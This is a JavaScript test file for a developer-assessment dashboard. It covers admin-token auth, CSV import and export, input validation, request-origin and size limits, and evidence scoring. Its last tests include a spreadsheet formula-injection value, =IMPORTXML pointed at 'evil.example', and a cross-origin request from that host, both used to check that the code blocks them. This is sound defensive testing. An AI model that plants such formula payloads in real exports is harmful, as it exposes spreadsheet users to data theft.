import assert from 'node:assert/strict';
import test from 'node:test';

process.env.ADMIN_IMPORT_TOKEN = 'test-admin-token';
process.env.PILOT_IMPORT_ORG_SLUG = 'itti';

const {
  HttpError,
  assertAdminImportAuthorized,
  assertAllowedPostOrigin,
  assertPostRequestAllowed,
  calculateEvidenceConfidence,
  createProofOfSkillsExternalRef,
  csvEscape,
  getDeclaredContentLength,
  normalizeHistory,
  parseCollaboratorCsv,
  rowsToCsv,
  validateDeveloperInput
} = await import('./dashboard.mjs');

test('admin collaborator import requires the configured token', () => {
  assert.throws(
    () => assertAdminImportAuthorized({ headers: {} }),
    error => error instanceof HttpError && error.statusCode === 403
  );

  assert.doesNotThrow(() => assertAdminImportAuthorized({
    headers: { 'x-admin-token': 'test-admin-token' }
  }));

  assert.doesNotThrow(() => assertAdminImportAuthorized({
    headers: { authorization: 'Bearer test-admin-token' }
  }));
});

test('CSV import forces the Itti destination org while preserving source org for validation', () => {
  const rows = parseCollaboratorCsv(`email,org_slug,current_seniority,target_seniority,tech_track
ana.gomez@itti.digital,ueno-bank,JUNIOR_2,MID_2,BACKEND_NODE`, 'itti');

  assert.equal(rows.length, 1);
  assert.equal(rows[0].orgSlug, 'itti');
  assert.equal(rows[0].sourceOrgSlug, 'ueno-bank');
});

test('developer input normalizes org slugs and rejects invalid levels', () => {
  const valid = validateDeveloperInput({
    email: ' ANA.GOMEZ@ITTI.DIGITAL ',
    orgSlug: ' ITTI ',
    currentSeniority: 'junior_2',
    targetSeniority: 'mid_2',
    techTrack: 'backend_node'
  });

  assert.equal(valid.email, 'ana.gomez@itti.digital');
  assert.equal(valid.orgSlug, 'itti');
  assert.equal(valid.currentSeniority, 'JUNIOR_2');

  assert.throws(() => validateDeveloperInput({
    email: 'ana.gomez@itti.digital',
    orgSlug: 'itti',
    currentSeniority: 'STAFF',
    targetSeniority: 'MID_2',
    techTrack: 'BACKEND_NODE'
  }), /Nivel actual invalido/);
});

test('Proof of Skills external ref is unique to evidence without exposing PII', () => {
  const at = new Date('2026-10-07T12:34:56.789Z');
  const history = [
    { role: 'agent', message: 'Caso inicial' },
    { role: 'user', message: 'Disenaria una transaccion ACID con locks e idempotencia.' }
  ];

  const first = createProofOfSkillsExternalRef('dev-123', history, at);
  const second = createProofOfSkillsExternalRef('dev-123', [
    ...history,
    { role: 'user', message: 'Tambien agregaria metricas y alertas.' }
  ], at);

  assert.match(first, /^POS-20261007-123456789-[a-f0-9]{16}$/);
  assert.notEqual(first, second);
  assert.equal(first.includes('dev-123'), false);
  assert.equal(first.includes('ACID'), false);
});

test('evidence confidence is derived from response depth and skill breadth', () => {
  const shallow = calculateEvidenceConfidence([
    { role: 'agent', message: 'Pregunta' },
    { role: 'user', message: 'No se.' }
  ], 1);

  const deep = calculateEvidenceConfidence([
    { role: 'agent', message: 'Pregunta' },
    { role: 'user', message: 'Primero aislaria la transaccion y definiria invariantes de negocio.' },
    { role: 'agent', message: 'Seguimiento' },
    { role: 'user', message: 'Luego agregaria idempotencia, retry con backoff, logs estructurados, metricas, trazas y alertas por SLO para observar fallos.' },
    { role: 'agent', message: 'Seguimiento' },
    { role: 'user', message: 'Validaria con pruebas unitarias, integracion y casos de concurrencia para evitar race conditions.' }
  ], 4);

  assert.equal(shallow >= 0.55, true);
  assert.equal(deep > shallow, true);
  assert.equal(deep <= 0.95, true);
});

test('evidence confidence counts distinct evaluated skills only', () => {
  const history = [
    { role: 'agent', message: 'Pregunta' },
    { role: 'user', message: 'Respuesta con detalles tecnicos suficientes para estimar profundidad.' }
  ];
  const duplicateBreadth = calculateEvidenceConfidence(history, [
    { skillKey: 'TESTING_STRATEGY' },
    { skillKey: 'TESTING_STRATEGY' },
    { skillKey: 'TESTING_STRATEGY' }
  ]);
  const singleBreadth = calculateEvidenceConfidence(history, [
    { skillKey: 'TESTING_STRATEGY' }
  ]);

  assert.equal(duplicateBreadth, singleBreadth);
});

test('history normalization removes empty or malformed turns', () => {
  assert.deepEqual(normalizeHistory([
    { role: 'user', message: '  respuesta ' },
    { role: '', message: 'sin rol' },
    { role: 'agent', message: '' },
    null
  ]), [
    { role: 'user', message: 'respuesta' }
  ]);
});

test('POST requests reject text/plain and require JSON content type', () => {
  assert.throws(
    () => assertPostRequestAllowed({
      headers: {
        host: 'localhost:3005',
        'content-type': 'text/plain'
      }
    }),
    error => error instanceof HttpError && error.statusCode === 415
  );

  assert.doesNotThrow(() => assertPostRequestAllowed({
    headers: {
      host: 'localhost:3005',
      'content-type': 'application/json; charset=utf-8'
    }
  }));
});

test('POST requests reject cross-origin browser submissions', () => {
  assert.throws(
    () => assertAllowedPostOrigin({
      headers: {
        host: 'localhost:3005',
        origin: 'http://evil.example'
      }
    }),
    error => error instanceof HttpError && error.statusCode === 403
  );

  assert.doesNotThrow(() => assertAllowedPostOrigin({
    headers: {
      host: 'localhost:3005',
      origin: 'http://localhost:3005'
    }
  }));
});

test('POST requests reject oversized declared bodies before parsing', () => {
  assert.equal(getDeclaredContentLength({ 'content-length': '256001' }), 256001);

  assert.throws(
    () => assertPostRequestAllowed({
      headers: {
        host: 'localhost:3005',
        'content-type': 'application/json',
        'content-length': '256001'
      }
    }),
    error => error instanceof HttpError && error.statusCode === 413
  );
});

test('pilot report CSV escapes values and uses safe export columns', () => {
  const headers = [
    'email',
    'pos_status',
    'last_external_ref',
    'avg_score',
    'completed_modules'
  ];
  const csv = rowsToCsv(headers, [{
    email: 'ana.gomez@itti.digital',
    pos_status: 'COMPLETED',
    last_external_ref: 'POS-20261007-123456789-abcdef1234567890',
    avg_score: 4.25,
    completed_modules: 1,
    raw_evaluations: '{"prompt":"secret"}'
  }, {
    email: 'bruno,rios@itti.digital',
    pos_status: 'PENDING',
    last_external_ref: '',
    avg_score: 0,
    completed_modules: 0
  }]);

  assert.equal(csv.includes('raw_evaluations'), false);
  assert.equal(csv.includes('secret'), false);
  assert.equal(csv.split('\r\n')[0], headers.join(','));
  assert.match(csv, /"bruno,rios@itti\.digital",PENDING/);
});

test('CSV escaping protects quotes and newlines', () => {
  assert.equal(csvEscape('plain'), 'plain');
  assert.equal(csvEscape('a,b'), '"a,b"');
  assert.equal(csvEscape('a"b'), '"a""b"');
  assert.equal(csvEscape('a\nb'), '"a\nb"');
  assert.equal(csvEscape('=IMPORTXML("http://evil.example")'), `"'=IMPORTXML(""http://evil.example"")"`);
  assert.equal(csvEscape('@SUM(1,2)'), `"'@SUM(1,2)"`);
});
